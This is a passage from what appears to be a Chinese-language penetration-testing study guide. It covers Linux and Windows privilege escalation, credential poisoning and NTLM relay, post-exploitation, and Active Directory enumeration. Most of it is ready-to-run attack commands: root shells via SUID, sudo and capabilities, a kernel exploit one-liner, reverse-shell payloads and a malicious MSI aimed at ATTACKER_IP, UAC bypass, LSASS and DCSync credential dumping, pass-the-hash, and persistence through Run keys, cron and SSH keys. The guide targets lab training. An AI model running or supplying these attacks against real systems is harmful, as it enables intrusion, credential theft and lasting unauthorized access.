# 带 SUID 的 vim：
vim -c ':!/bin/bash -p'

# 带 SUID 的 cp（覆盖 /etc/passwd）：
echo "hacked::0:0:root:/root:/bin/bash" > /tmp/newroot
cp /tmp/newroot /etc/passwd
su hacked     # 无需密码；UID 0 = root

# 带 SUID 的旧版 nmap（5.35 之前）：
nmap --interactive
nmap> !bash

# 带 SUID 的 less：
less /etc/passwd
!/bin/bash
```

---

### 3.3 Sudo 规则

```bash
# 你能免密以 root 运行什么？
sudo -l
# 关键输出：
# (ALL) NOPASSWD: ALL              -> 立刻 sudo su
# (ALL) NOPASSWD: /usr/bin/find   -> 查 GTFOBins 的 find
# (root) NOPASSWD: /usr/bin/vim   -> GTFOBins 的 vim

# GTFOBins：sudo 部分示例
# find：
sudo find /etc/passwd -exec /bin/bash \;
# vim：
sudo vim -c ':!/bin/bash'
# python3：
sudo python3 -c 'import os; os.system("/bin/bash")'
# awk：
sudo awk 'BEGIN {system("/bin/bash")}'
# env：
sudo env /bin/bash
# tee（以 root 读取任意文件）：
echo "hacked::0:0:root:/root:/bin/bash" | sudo tee -a /etc/passwd
su hacked

# sudo 版本漏洞利用（CVE-2021-3156 Baron Samedit：sudo < 1.9.5p2）
sudo --version
# 影响范围：sudo 1.8.2 至 1.9.5p1
# 利用代码：https://github.com/blasty/CVE-2021-3156
```

---

### 3.4 Linux 能力（Capabilities）

```bash
# 查找带 capabilities 的二进制文件
getcap -r / 2>/dev/null

# 危险的能力：
# cap_setuid：可切换到任意 UID，包括 root
# cap_net_raw：收发原始数据包
# cap_dac_read_search：绕过所有文件读取权限检查

# 带 cap_setuid 的 python3：
python3 -c 'import os; os.setuid(0); os.system("/bin/bash")'

# 带 cap_setuid 的 perl：
perl -e 'use POSIX qw(setuid); POSIX::setuid(0); exec "/bin/bash";'

# 带 cap_dac_read_search 的 tar（读取 /etc/shadow）：
tar -cvf /tmp/shadow.tar /etc/shadow
tar -xvf /tmp/shadow.tar -C /tmp/
cat /tmp/etc/shadow

# 带 cap_setuid 的 node：
node -e "process.setuid(0); require('child_process').spawn('/bin/bash', {stdio: [0,1,2]})"
```

---

### 3.5 Cron 任务与 PATH 劫持

```bash
# 查找以 root 运行的 cron 任务：
cat /etc/crontab
ls -la /etc/cron.d/ /etc/cron.daily/ /etc/cron.hourly/ /etc/cron.weekly/
crontab -l
ls /var/spool/cron/crontabs/

# 由 root cron 执行的可写脚本：
# 如果 /etc/crontab 中有：* * * * * root /opt/backup.sh
ls -la /opt/backup.sh         # 它可写吗？
echo "chmod +s /bin/bash" >> /opt/backup.sh
# 等待 cron 执行：
bash -p                        # Root shell

# cron 中的 PATH 劫持：
# 如果 root 的 cron 脚本运行命令时未用完整路径：
echo '#!/bin/bash' > /tmp/cleanup
echo 'chmod +s /bin/bash' >> /tmp/cleanup
chmod +x /tmp/cleanup
# 等待 cron 执行：
bash -p

# 查找父目录可写的脚本：
find / -writable -name "*.sh" 2>/dev/null
find / -writable -path "/etc/cron*" 2>/dev/null
```

---

### 3.6 可写的 /etc/passwd

```bash
# 检查 /etc/passwd 是否可写：
[ -w /etc/passwd ] && echo "WRITABLE: exploit immediately"

# 生成密码哈希：
openssl passwd -1 -salt crow "password123"

# 添加一个 root 级用户：
echo "crow:\$1\$crow\$HASH_VALUE:0:0:root:/root:/bin/bash" >> /etc/passwd
su crow     # 密码：password123
```

---

### 3.7 NFS 配置错误

```bash
# 从攻击机：查找 NFS 共享
showmount -e TARGET_IP

# 检查目标上的 /etc/exports：
# /share 192.168.1.0/24(rw,no_root_squash)  <- 存在漏洞
# /share 192.168.1.0/24(rw,root_squash)     <- 不存在漏洞

# 利用：挂载该共享（你在攻击机上是 root）
mkdir /tmp/nfs_mount
sudo mount -t nfs TARGET_IP:/share /tmp/nfs_mount

# 在已挂载的共享上创建 SUID root 二进制文件：
sudo cp /bin/bash /tmp/nfs_mount/rootbash
sudo chmod +s /tmp/nfs_mount/rootbash

# 在目标上以低权限用户：
/share/rootbash -p    # SUID 二进制 -> root shell
```

---

### 3.8 内核漏洞利用 - 最后手段

```bash
# 获取内核版本：
uname -r
# 示例：5.4.0-42-generic

# 检索漏洞利用：
searchsploit linux kernel 5.4

# DirtyPipe（CVE-2022-0847）：Linux 内核 5.8 到 5.16.10
# 以任意用户身份覆写只读文件（包括 /etc/passwd）
# https://github.com/AlexisAhmed/CVE-2022-0847-DirtyPipe-Exploits
./exploit-1    # 修改 /etc/passwd 添加 root 用户
./exploit-2    # 覆写 SUID 二进制文件以执行 /bin/sh

# GameOver(lay)（CVE-2023-2640 / CVE-2023-32629）：Ubuntu 特有
# 影响：OverlayFS 配置错误的 Ubuntu 内核
# https://github.com/g1vi/CVE-2023-2640-CVE-2023-32629
unshare -rm sh -c "mkdir l u w m && cp /u*/b*/p*3 l/;setcap cap_setuid+eip l/python3;mount -t overlay overlay -o rw,lowerdir=l,upperdir=u,workdir=w m && touch m/*" && u/python3 -c 'import os;os.setuid(0);os.system("bash")'
# 先检查目标 Ubuntu 版本：lsb_release -a
```

---

### 3.9 用 LinPEAS 自动枚举

```bash
# 下载并运行 LinPEAS（始终用最新版）：
curl -L https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh -o linpeas.sh
chmod +x linpeas.sh
./linpeas.sh 2>/dev/null | tee /tmp/linpeas_out.txt

# 在内存中运行（不写文件到磁盘）：
curl -sL https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh | bash

# LinPEAS 输出颜色含义：
# 红底红字：99% 是提权路径：立刻检查
# 红字：高关注度发现
# 黄字：值得手动调查

# 运行 LinPEAS 之后的方法论：
# 1. 先看每一条红底红字的发现
# 2. 逐条手动验证（LinPEAS 会有误报）
# 3. 用 GTFOBins 核对每个 SUID 二进制文件
# 4. 用 GTFOBins 核对每条 sudo 规则
# 5. 仔细阅读 cron 部分
```

---

### 3.10 实验练习

在 HackTheBox 上用每次不同的提权方法拿下 5 台以上 Linux 机器：

```
机器：[名称]
初始访问方法：[你是怎么进去的]
提权路径：[你利用了哪些问题]
使用的命令：[确切命令]
产生的痕迹：[存在哪些日志]
```

---

---

## 第 4 节：权限提升 - Windows

### 这是什么，为什么重要

Windows 提权意味着拿到 `NT AUTHORITY\SYSTEM`。SYSTEM 的权限高于 Administrator。拿到 SYSTEM 通常意味着能读取其上存储的所有凭据，包括缓存在 LSASS 中的域凭据。

### Windows 提权决策树

<div align="center">
<table><tr><td>

<img src="../assets/diagrams/PHASE_2/11._MISSED_Windows_PrivEsc_Decision_Tree.png" alt="Windows PrivEsc Decision Tree" width="1000"/>

</td></tr></table>
</div>


---

### 课程

| 资源 | 类型 | 时长 | 费用 | 备注 |
|----------|------|----------|------|-------|
| [PayloadsAllTheThings Windows PrivEsc](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Windows%20-%20Privilege%20Escalation.md) | 参考 | 5 小时 | 免费 | 全面的参考。 |
| [WinPEAS](https://github.com/peass-ng/PEASS-ng/tree/master/winPEAS) | 工具 | 2 小时 | 免费 | 自动化枚举器。 |
| [Potato Exploits Guide](https://jlajara.gitlab.io/Potatoes_Windows_PrivEsc) | 参考 | 2 小时 | 免费 | 讲解 SeImpersonatePrivilege 相关技术。 |
| [TryHackMe Windows PrivEsc](https://tryhackme.com/room/windows10privesc) | 靶场 | 5 小时 | 免费 | 引导式练习。 |
| [UACME](https://github.com/hfiref0x/UACME) | 工具 | 2 小时 | 免费 | 收录并可用 70 多种 UAC 绕过技术。 |

---

### 4.1 态势感知 - 立即运行这些

```powershell
# 你是谁？
whoami
whoami /groups    # 组成员关系：寻找本地/域管理员组
whoami /priv      # 令牌特权：仔细阅读（见 4.2）

# 系统信息
systeminfo
hostname
echo %COMPUTERNAME%
echo %USERDOMAIN%     # Are we domain-joined?

# 运行中的进程（寻找 AV、EDR、值得关注的服务）
tasklist /svc
Get-Process | Select-Object Name, Id, Path, Company

# 网络
ipconfig /all
netstat -ano

# 用户与组
net user
net localgroup administrators
net user administrator

# 已安装软件（寻找带已知 CVE 的过时软件）
Get-ItemProperty HKLM:\Software\Microsoft\Windows\CurrentVersion\Uninstall\* |
  Select-Object DisplayName, DisplayVersion | Sort-Object DisplayName

# 正在监听的端口
netstat -ano | findstr LISTENING
```

---

### 4.2 令牌特权 - 最重要的一项检查

在任何 Windows shell 上，最值得检查的一件事就是 `whoami /priv`。

```powershell
whoami /priv

# SeImpersonatePrivilege -> 通过 Potato 系列利用获得 SYSTEM
# 最常见于 IIS、MSSQL、WCF 服务账户的 shell 中。

# GodPotato（最现代：Windows 10/11 和 Server 2022）：
# https://github.com/BeichenDream/GodPotato
.\GodPotato.exe -cmd "cmd /c whoami"
.\GodPotato.exe -cmd "cmd /c net user hacker P@ssword123! /add && net localgroup administrators hacker /add"

# PrintSpoofer（Windows 10、Server 2016/2019/2022）：
# https://github.com/itm4n/PrintSpoofer
.\PrintSpoofer.exe -i -c cmd.exe         # 交互式 SYSTEM shell
.\PrintSpoofer.exe -c "whoami"

# SweetPotato（结合多种 potato 技术）：
# https://github.com/CCob/SweetPotato
.\SweetPotato.exe -e EfsRpc -p cmd.exe

# SeDebugPrivilege -> 转储 LSASS -> 获取所有缓存凭据
.\procdump.exe -accepteula -ma lsass.exe C:\Temp\lsass.dmp
# 在攻击机上解析转储：
pip3 install pypykatz
pypykatz lsa minidump lsass.dmp

# SeBackupPrivilege -> 读取任意文件
reg save HKLM\SAM C:\Temp\SAM
reg save HKLM\SYSTEM C:\Temp\SYSTEM
# 把两个文件都传回来，提取哈希：
impacket-secretsdump -sam SAM -system SYSTEM LOCAL

# SeRestorePrivilege -> 写入任意文件
# 用 cmd.exe 替换 sethc.exe（粘滞键）：
copy /y C:\Windows\System32\cmd.exe C:\Windows\System32\sethc.exe
# 在 Windows 锁屏界面连按 5 次 SHIFT -> SYSTEM 权限的 cmd.exe

# SeLoadDriverPrivilege -> 加载有漏洞的内核驱动（BYOVD：阶段 4）
```

---

### 4.3 未加引号的服务路径

```powershell
# 查找未加引号的服务路径：
wmic service get name,pathname,startmode |
  findstr /i /v "C:\Windows" |
  findstr /i /v '"' |
  findstr /i "auto"

# Windows 如何解析 C:\Program Files\Some Service\binary.exe：
# 1. C:\Program.exe
# 2. C:\Program Files\Some.exe
# 3. C:\Program Files\Some Service\binary.exe

# 检查你能否写入有漏洞的目录：
icacls "C:\Program Files\"
# 查找：BUILTIN\Users:(W) 或你的用户名:(W)

# 投放载荷（AV 规避见第 10 节）：
msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACKER_IP LPORT=4444 -f exe -o Program.exe
copy Program.exe "C:\Program.exe"
sc stop "VulnerableServiceName"
sc start "VulnerableServiceName"
```

---

### 4.4 服务权限过弱

```powershell
# accesschk（Sysinternals）：检查谁能修改服务
.\accesschk.exe -uwcqv "Everyone" *
.\accesschk.exe -uwcqv "BUILTIN\Users" *
.\accesschk.exe -uwcqv "Authenticated Users" *
# 查找：SERVICE_CHANGE_CONFIG 权限

# 如果你能修改服务的二进制路径：
sc qc VulnerableService
sc config VulnerableService binpath= "net user hacker P@ssword! /add"
sc start VulnerableService
sc config VulnerableService binpath= "net localgroup administrators hacker /add"
sc start VulnerableService
```

---

### 4.5 AlwaysInstallElevated

```powershell
# 检查两个注册表键：两者都必须为 1：
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated

# 如果两者都 = 0x1：
# 在攻击机上生成恶意 MSI：
msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACKER_IP LPORT=4444 -f msi -o evil.msi

# 在目标上：
msiexec /quiet /qn /i C:\Temp\evil.msi
```

---

### 4.6 UAC 绕过 - fodhelper.exe

```powershell
# fodhelper 绕过（无提示，适用于 Windows 10/11）：
New-Item "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Force
Set-ItemProperty "HKCU:\Software\Classes\ms-settings\Shell\Open\command" `
  -Name "DelegateExecute" -Value ""
Set-ItemProperty "HKCU:\Software\Classes\ms-settings\Shell\Open\command" `
  -Name "(default)" -Value "cmd.exe /c start cmd.exe"
Start-Process "C:\Windows\System32\fodhelper.exe"
# 结果：cmd.exe 以高完整性打开，且不弹 UAC 提示

# 清理：
Remove-Item "HKCU:\Software\Classes\ms-settings\" -Recurse -Force

# 70 多种 UAC 绕过技术的完整列表：
# https://github.com/hfiref0x/UACME
```

---

### 4.7 DLL 劫持

```powershell
# 用 Process Monitor（procmon）寻找 DLL 劫持机会：
# 过滤条件：Operation = CreateFile，Result = NAME NOT FOUND，Path 以 .dll 结尾

# 验证你能写入该目录：
icacls "C:\path\to\writable\dir\"

# 在攻击机上生成恶意 DLL：
msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACKER_IP LPORT=4444 -f dll -o missing_dll.dll

# 放到 procmon 找到的可写路径中
# 重启有漏洞的服务，或等待应用重新加载
```

---

### 4.8 用 WinPEAS 自动枚举

```powershell
# 下载：https://github.com/peass-ng/PEASS-ng/releases

# 在目标上运行（但先看第 10 节：WinPEAS 默认会触发 Defender）：
.\winPEAS.exe > C:\Temp\winpeas_out.txt 2>&1

# 从内存运行（不写磁盘：首选）：
IEX (New-Object Net.WebClient).DownloadString('http://ATTACKER_IP/winPEAS.ps1')

# WinPEAS 颜色含义：
# 黄色：高度关注
# 青色：发现用户和密码
# 红色：关键发现

# 也运行 Seatbelt（更细粒度、检测率更低）：
.\Seatbelt.exe -group=all > C:\Temp\seatbelt_out.txt
# https://github.com/GhostPack/Seatbelt
.\Seatbelt.exe CredEnum
.\Seatbelt.exe TokenPrivileges
```

**OPSEC 提示：** 把 `winPEAS.exe` 写到磁盘会在任何现代 Windows 系统上触发 Windows Defender。请用从内存加载的 PowerShell 版本，或使用 Seatbelt。在目标上运行任何攻击工具之前，先复习第 10 节（AV/EDR 规避）。

---

---

## 第 5 节：凭据投毒与中继攻击

### 这是什么，为什么重要

本节涵盖大多数初学者路线图完全略过的技术。这些是**被动**攻击和中继攻击：在不利用传统意义上任何漏洞的情况下收集凭据并获得访问。

**核心思路：** Windows 网络在 DNS 解析失败时使用 LLMNR（链路本地多播名称解析）和 NBT-NS（NetBIOS 名称服务）来解析主机名。这些协议会向整个网段广播查询。当某台机器问“谁是 FILESERVRE？”（UNC 路径里的一个拼写错误）而无人应答时，你来回话。机器信任你的响应，尝试向你认证，并发送它的 NTLMv2 哈希。你离线破解它，或把它中继到别处。

这几乎在所有未做加固的企业 Windows 网络上都能奏效。它一直是内网渗透测试中收益最高的技术之一。

### NTLM 中继攻击流程

<div align="center">
<table><tr><td>

<img src="../assets/diagrams/PHASE_2/5._NTLM_Relay_Attack_Flow.png" alt="NTLM Relay Attack Flow" width="900"/>

</td></tr></table>
</div>

---

### 课程

| 资源 | 类型 | 时长 | 费用 | 备注 |
|----------|------|----------|------|-------|
| [Responder GitHub](https://github.com/lgandx/Responder) | 工具 | 3 小时 | 免费 | 通读完整 README 和配置文件。 |
| [TCM Security - Practical Ethical Hacking](https://academy.tcm-sec.com/) | 课程 | 4 小时 | $30 | 面向初学者最好的 LLMNR/NBT-NS 讲解。 |
| [NTLM Relay Guide - byt3bl33d3r](https://byt3bl33d3r.github.io/practical-guide-to-ntlm-relaying-in-2017.html) | 博客 | 2 小时 | 免费 | 概念基础。现在仍然准确。 |
| [mitm6 + ntlmrelayx Guide](https://blog.fox-it.com/2018/01/11/mitm6-compromising-ipv4-networks-via-ipv6/) | 博客 | 2 小时 | 免费 | Fox-IT 的原始文章。使用工具前先读。 |

---

### 5.1 Responder - 被动捕获 NTLMv2

```bash
# 检查你的网络接口：
ip a         # 注意：eth0、wlan0、tun0 等

# 启动 Responder（整个项目期间一直运行：它是被动的）：
sudo responder -I eth0 -wrf
# -I eth0：在此接口上监听
# -w：WPAD 服务器（提供恶意的 WPAD 代理自动配置）
# -r：应答 NetBIOS 查询
# -f：指纹识别操作系统/浏览器

# Responder 捕获到的内容如下：
# [*] [NBT-NS] Poisoned answer sent to 192.168.1.50 for name FILESERVRE
# [SMB] NTLMv2 Client   : 192.168.1.50
# [SMB] NTLMv2 Username : LAB\administrator
# [SMB] NTLMv2 Hash     : administrator::LAB:aabbccdd...:hash_here

# 哈希保存到：
cat /usr/share/responder/logs/SMB-NTLMv2-SSP-192.168.1.50.txt

# 用 hashcat 破解：
hashcat -m 5600 /usr/share/responder/logs/*.txt /usr/share/wordlists/rockyou.txt
# -m 5600：NTLMv2 哈希模式
```

---

### 5.2 NTLM 中继 - 从哈希到 RCE

```bash
# 前提条件：目标的 SMB 签名必须禁用或非必需。
# 检查整个网络的 SMB 签名：
nxc smb 192.168.1.0/24 --gen-relay-list relay_targets.txt
# relay_targets.txt 将包含未强制 SMB 签名的 IP

# 准备：你需要同时运行两个工具：

# 终端 1：在 Responder 中关闭 SMB 和 HTTP
sudo nano /etc/responder/Responder.conf
# 设置：SMB = Off，HTTP = Off

sudo responder -I eth0 -wrf    # 仍会投毒 LLMNR，但不处理认证

# 终端 2：ntlmrelayx
impacket-ntlmrelayx -tf relay_targets.txt -smb2support
# 中继到文件中的所有目标 -> 当受害者在目标上有管理员权限时导出 SAM 哈希

# 中继以获得交互式 shell：
impacket-ntlmrelayx -tf relay_targets.txt -smb2support -i
nc 127.0.0.1 11000    # 连接到该 shell

# 中继执行命令：
impacket-ntlmrelayx -tf relay_targets.txt -smb2support -c "whoami > C:\Temp\whoami.txt"

# 通过 HTTP 中继到 LDAP（SMB 中继被封时有用）：
impacket-ntlmrelayx -t ldap://DC_IP --no-smb-server --http-port 80
# 在 Active Directory 中创建新用户，或导出 LDAP 数据
```

---

### 5.3 mitm6 - IPv6 + DHCPv6 投毒（高产）

**为什么有效：** 大多数企业网络是双栈的（IPv4 和 IPv6 都启用），但 IPv6 基础设施很少被配置。两者都可用时，Windows 优先使用 IPv6。通过发送伪造的 DHCPv6 响应，你成为 IPv6 路由器。你也成为它们的 DNS 服务器，于是每一次在 IPv4 上失败的主机名解析都会经过你。

```bash
# 安装 mitm6：
pip3 install mitm6

# 终端 1：启动 mitm6（针对你的域）：
sudo mitm6 -d lab.local
# mitm6 每隔几秒发送 DHCPv6 通告
# 机器接受你的 DHCPv6 租约 -> 你成为它们的 DNS 服务器
# 当它们查询任何内部主机名时，你用你的 IP 作答
# 这会触发针对你机器的 NTLM 认证尝试

# 终端 2：用 ntlmrelayx 捕获并中继：
impacket-ntlmrelayx -6 -t ldaps://DC_IP -wh WPAD -l /tmp/loot/ --delegate-access
# -6：在 IPv6 上监听
# -t ldaps://DC_IP：通过 LDAPS 中继到域控制器
# -wh WPAD：托管伪造的 WPAD 文件（触发浏览器认证）
# -l /tmp/loot/：保存 LDAP 枚举结果
# --delegate-access：为以下对象配置基于资源的约束委派：
#                    攻击者控制的机器 -> 获得域持久化

# 你能得到什么：
# - Active Directory 对象的 LDAP 转储（用户、组、计算机）
# - 如果域管理员账户触发认证 -> 可能通过委派拿到 DA
# - 至少：从 AD 完整枚举用户
```

> **为什么比单用 Responder 收益更高：** mitm6 不依赖 LLMNR 拼写错误。它主动把自己推成整个子网的 DNS 服务器。网段上的每台机器最终都会找它做 DNS 解析。

---

### 5.4 NTLMv1 降级

```bash
# 检查目标是否接受 NTLMv1（需要 Responder 处于分析模式）：
sudo responder -I eth0 -A
# -A：分析模式：不投毒，只观察

# 通过 Responder 配置强制降级到 NTLMv1：
sudo nano /etc/responder/Responder.conf
# 设置：Challenge = 1122334455667788    # 固定挑战值以便彩虹表攻击

sudo responder -I eth0 --lm
# --lm：启用 LM 哈希捕获

# 捕获到固定挑战值的 NTLMv1：提交到 crack.sh（免费在线彩虹表）
# https://crack.sh/cracker/
# 大多数 NTLMv1 哈希几秒内就能破解
```

---

---

## 第 6 节：后渗透与横向移动

### 6.1 凭据转储

```bash
# LSASS 转储：Windows 把凭据缓存在 LSASS 进程内存中

# 方法 1：ProcDump（Sysinternals：合法、已签名二进制）
.\procdump.exe -accepteula -ma lsass.exe C:\Temp\lsass.dmp
# 把转储传到攻击机，解析：
pypykatz lsa minidump lsass.dmp

# 方法 2：任务管理器（无需二进制，图形界面）
# 任务管理器 -> 详细信息选项卡 -> 右键 lsass.exe -> 创建转储文件

# 方法 3：原生 PowerShell（无需二进制）
# 从内存使用 Invoke-Mimikatz（先看第 10 节的 AMSI 绕过）
IEX (New-Object Net.WebClient).DownloadString('http://ATTACKER_IP/Invoke-Mimikatz.ps1')
Invoke-Mimikatz -Command '"sekurlsa::logonpasswords"'

# 方法 4：impacket（远程转储：目标上不留二进制）
impacket-secretsdump domain/user:pass@TARGET_IP
# 如果目标是 DC：
impacket-secretsdump domain/da-user:pass@DC_IP -just-dc
# 从 NTDS.dit（域哈希数据库）导出所有哈希

# DCSync：不接触 NTDS.dit 就拉取域哈希
# 需要：域管理员权限 或 DS-Replication-Get-Changes-All 权限
impacket-secretsdump -just-dc domain/da-user:pass@DC_IP
```

**检测痕迹：**
- 对 LSASS 使用 ProcDump：Sysmon 事件 ID 10（ProcessAccess），目标为 lsass.exe
- impacket-secretsdump：远程注册表访问（事件 ID 4663）+ 短命的 SMB 连接
- DCSync：事件 ID 4662（目录服务访问），带 `DS-Replication-Get-Changes-All`

---

### 6.2 BloodHound 社区版 - 攻击路径可视化

> **关键：** 旧版 BloodHound（v4 及以下）已弃用。请使用 SpecterOps 的 BloodHound 社区版（CE）。

```bash
# 在攻击机上部署 BloodHound CE（需要 Docker）：
curl -L https://ghcr.io/bloodhoundad/bloodhound/main/docker-compose.yml -o docker-compose.yml
docker compose -f docker-compose.yml up -d

# 访问 Web 界面：http://localhost:8080
# 获取初始密码：
docker compose logs | grep "Initial Password"

# 收集 AD 数据：

# 选项 1：RustHound（最快、AV 检测率最低、Rust 二进制）
# https://github.com/NH-RED-TEAM/RustHound
.\rusthound.exe -d domain.local --dc DC_IP --output /tmp/

# 选项 2：SharpHound（功能最全、C#：更可能被标记）
.\SharpHound.exe -c All --zipfilename bloodhound_data.zip

# 选项 3：BloodHound.py（Python：从攻击机运行，目标上不留二进制）
pip3 install bloodhound
bloodhound-python -d domain.local -u user -p pass -dc DC_IP -c all

# 导入：Web UI -> Administration -> File Ingest -> 上传 zip/JSON 文件

# BloodHound CE 中的关键查询：
# “查找通往域管理员的最短路径”
# “查找所有域管理员”
# “查找域用户是本地管理员的计算机”
# “查找可 AS-REP Roast 的用户”
# “查找可 Kerberoast 的用户”

# 自定义 Cypher：查找从你已攻陷用户到 DA 的路径：
MATCH p=shortestPath(
  (u:User {name:"COMPROMISED_USER@DOMAIN.LOCAL"})-[*1..]->(g:Group {name:"DOMAIN ADMINS@DOMAIN.LOCAL"})
) RETURN p

# 标记已拿下节点：右键任意节点 -> Mark as Owned
```

**OPSEC 提示：** 2026-2027 年，大多数 EDR 产品都能检测到 SharpHound。RustHound 的检测率显著更低。从攻击机运行 BloodHound.py 会在 DC 上留下 LDAP 查询日志。

---

### 6.3 传递哈希（PtH）

```bash
# 在整个网段喷洒哈希：
nxc smb 192.168.1.0/24 -u administrator -H NTLM_HASH --local-auth
# --local-auth：以本地账户认证（而非域账户）：避免域锁定
# Pwned! = 你在这台机器上有本地管理员权限

# 通过 SMB 获得 SYSTEM shell（噪音大：创建 PSEXESVC 服务）：
impacket-psexec -hashes :NTLM_HASH administrator@TARGET_IP

# WMI shell（更安静：不创建服务，使用 DCOM）：
impacket-wmiexec -hashes :NTLM_HASH administrator@TARGET_IP

# SMB shell（不写磁盘）：
impacket-smbexec -hashes :NTLM_HASH administrator@TARGET_IP

# WinRM shell（如果启用了 WinRM，这是最安静的）：
evil-winrm -i TARGET_IP -u administrator -H NTLM_HASH

# 用 PtH 进行 RDP（需要 Restricted Admin 模式）：
xfreerdp /v:TARGET_IP /u:administrator /pth:NTLM_HASH /cert-ignore
```

---

### 6.4 传递票据（PtT）- Kerberos

```bash
# 列出 Windows 上的当前票据：
klist

# 用 mimikatz 转储票据：
mimikatz # sekurlsa::tickets /export
# 生成：[user@service].kirbi 文件

# 导入窃取的票据：
mimikatz # kerberos::ptt Administrator@krbtgt-LAB.LOCAL.kirbi
# 或者用 Rubeus：
.\Rubeus.exe ptt /ticket:base64_encoded_ticket_here

# 把 kirbi 转成 ccache（供 Linux 上的 impacket 使用）：
python3 /opt/impacket/utils/ticketConverter.py ticket.kirbi ticket.ccache
export KRB5CCNAME=/path/to/ticket.ccache
impacket-secretsdump -k -no-pass domain/user@DC_IP
```

---

### 6.5 WMI 横向移动

```bash
# impacket-wmiexec（半交互，不创建服务）：
impacket-wmiexec domain/user:pass@TARGET_IP
impacket-wmiexec -hashes :NTLM_HASH domain/user@TARGET_IP

# 原生 Windows（从已攻陷的 Windows 机器）：
wmic /node:TARGET_IP /user:DOMAIN\user /password:pass \
  process call create "cmd.exe /c whoami > C:\Temp\out.txt"

# PowerShell 远程处理（基于 WinRM）：
$cred = New-Object System.Management.Automation.PSCredential(
  "DOMAIN\user", (ConvertTo-SecureString "Password123!" -AsPlainText -Force))
Invoke-Command -ComputerName TARGET_IP -Credential $cred -ScriptBlock { whoami; hostname }
```

---

### 6.6 基础持久化

```powershell
# 注册表 Run 键
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v "Updater" /t REG_SZ /d "C:\Temp\payload.exe" /f
reg add "HKLM\Software\Microsoft\Windows\CurrentVersion\Run" /v "Updater" /t REG_SZ /d "C:\Temp\payload.exe" /f

# 计划任务
schtasks /create /tn "SystemUpdate" /tr "C:\Temp\payload.exe" /sc onstart /ru SYSTEM /f
schtasks /create /tn "HourlySync" /tr "C:\Temp\payload.exe" /sc hourly /f

# Linux 持久化
mkdir -p ~/.ssh
echo "ssh-rsa YOUR_PUBLIC_KEY_HERE" >> ~/.ssh/authorized_keys
chmod 600 ~/.ssh/authorized_keys
chmod 700 ~/.ssh

# Cron 任务：
echo "* * * * * /tmp/payload.sh" | crontab -

# Bash 配置文件：
echo "/tmp/payload.sh &" >> ~/.bashrc
```

> 关于能承受重启和 EDR 重启的 C2 持久化，见第 11 节。

---

---

## 第 6.6 节：Active Directory 枚举与攻击

### 这是什么，为什么重要

当你在一台已加入域的机器上取得立足点，你就立刻身处 Active Directory 环境之中。本节涵盖从初始枚举到高级攻击的全部内容，包括 ADCS 利用、ACL 滥用、影子凭据、LAPS 绕过和委派攻击。

### AD 攻击面地图

<div align="center">
<table><tr><td>

<img src="../assets/diagrams/PHASE_2/6._AD_Attack_Surface_Map.png" alt="AD Attack Surface Map" width="1400"/>

</td></tr></table>
</div>

---

### 6.6.1 手动 AD 枚举

```powershell
# 域基础信息
net user /domain                      # 所有域用户
net group /domain                     # 所有域组
net group "Domain Admins" /domain     # 谁在 Domain Admins 中
net group "Enterprise Admins" /domain
net group "Domain Controllers" /domain
net accounts /domain                  # 密码策略：喷洒之前先读这个

# 查找域控制器
nltest /dclist:domain.local
nslookup -type=SRV _ldap._tcp.dc._msdcs.domain.local

# 当前用户的域组成员关系
net user %USERNAME% /domain

# 查找域中的计算机
net view /domain
```

---

### 6.6.2 PowerShell AD 枚举

```powershell
# 导入 Active Directory 模块（装有 RSAT 或 AD DS 的机器上可用）：
Import-Module ActiveDirectory

# 获取所有用户：
Get-ADUser -Filter * -Properties * | Select-Object Name, SamAccountName, DistinguishedName, Enabled

# 查找可 AS-REP Roast 的账户（无需预认证）：
Get-ADUser -Filter {DoesNotRequirePreAuth -eq $true} -Properties DoesNotRequirePreAuth

# 查找可 Kerberoast 的账户（已设置 SPN）：
Get-ADUser -Filter {ServicePrincipalName -ne "$null"} -Properties ServicePrincipalName

# 查找计算机：
Get-ADComputer -Filter * | Select-Object Name, OperatingSystem, OperatingSystemVersion

# 查找组和成员：
Get-ADGroup -Filter * | Select-Object Name, GroupScope
Get-ADGroupMember "Domain Admins" | Select-Object Name, SamAccountName

# 当前域信息：
Get-ADDomain | Select-Object Name, DomainMode, PDCEmulator, RIDMaster
```

---

### 6.6.3 rpcclient - 原始 RPC 枚举

```bash
# 使用凭据连接：
rpcclient -U "domain/user%Password123" DC_IP

# 匿名连接（在配置错误的环境中可能有效）：
rpcclient -N DC_IP

# 在 rpcclient 会话内：
rpcclient> enumdomusers              # 所有域用户及其 RID
rpcclient> enumdomgroups             # 所有域组及其 RID
rpcclient> queryuser 0x1f4           # 按 RID 查询用户信息（0x1f4 = 500 = Administrator）
rpcclient> querygroupmem 0x200       # Domain Admins 的成员（RID 512 = 0x200）
rpcclient> getdompwinfo              # 密码策略（锁定阈值）
rpcclient> netshareenumall           # 服务器上的所有共享
rpcclient> lsaenumsid                # 所有 SID

# RID 循环（在某些环境中无需凭据即可枚举用户）：
for i in $(seq 500 2000); do
  rpcclient -N DC_IP -c "queryuser $(printf '0x%x' $i)" 2>/dev/null | grep "User Name"
done
```

---

### 6.6.4 ldapsearch 与 enum4linux-ng

```bash
# 匿名 LDAP 查询：
ldapsearch -H ldap://DC_IP -x -s base namingcontexts

# 枚举所有用户：
ldapsearch -H ldap://DC_IP -x -D "domain\\user" -w "Password123" \
  -b "DC=domain,DC=local" "(objectClass=user)" sAMAccountName cn mail

# 查找可 AS-REP Roast 的账户：
ldapsearch -H ldap://DC_IP -x -D "domain\\user" -w "Password123" \
  -b "DC=domain,DC=local" "(userAccountControl:1.2.840.113556.1.4.803:=4194304)" sAMAccountName

# 查找可 Kerberoast 的账户：
ldapsearch -H ldap://DC_IP -x -D "domain\\user" -w "Password123" \
  -b "DC=domain,DC=local" "(servicePrincipalName=*)" sAMAccountName servicePrincipalName

# enum4linux-ng（现代化的一体化工具）：
pip3 install enum4linux-ng
enum4linux-ng -A -u user -p Password123 DC_IP
# 关键输出：密码策略、用户、组、共享、操作系统版本
```

---

